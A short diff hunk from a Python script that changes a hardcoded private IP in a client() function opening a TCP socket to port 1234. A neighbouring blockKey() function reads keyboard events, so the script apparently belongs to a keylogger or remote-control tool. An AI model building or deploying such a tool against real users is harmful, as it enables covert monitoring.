@@ -112,7 +112,7 @@ def blockKey():
     keyboard.read_event(key)
 
 def client():
-    host = '192.168.1.38' 
+    host = '192.168.1.39' 
     port = 1234  
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client_socket.connect((host, port))
